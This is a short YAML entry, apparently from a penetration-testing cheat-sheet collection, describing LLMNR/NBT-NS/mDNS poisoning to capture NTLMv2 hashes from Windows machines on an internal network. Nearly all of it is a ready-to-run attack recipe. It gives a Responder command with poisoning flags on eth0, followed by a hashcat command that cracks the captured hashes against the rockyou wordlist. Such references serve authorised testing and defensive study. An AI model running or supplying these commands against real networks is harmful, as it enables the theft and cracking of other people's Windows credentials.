---
description: |
  Poison LLMNR/NBT-NS/mDNS requests on the local network to capture
  NTLMv2 hashes from Windows machines.

  Reference values:
    Interface: eth0
command: |
  # Start Responder
  sudo responder -I eth0 -dwPv

  # Crack captured hashes
  hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - NTLM
  - SMB
ports:
  - "445"
  - "139"
items:
  - No_Creds
techniques:
  - LLMNR_Poisoning
network_position:
  - Internal
references:
  - https://github.com/lgandx/Responder
---
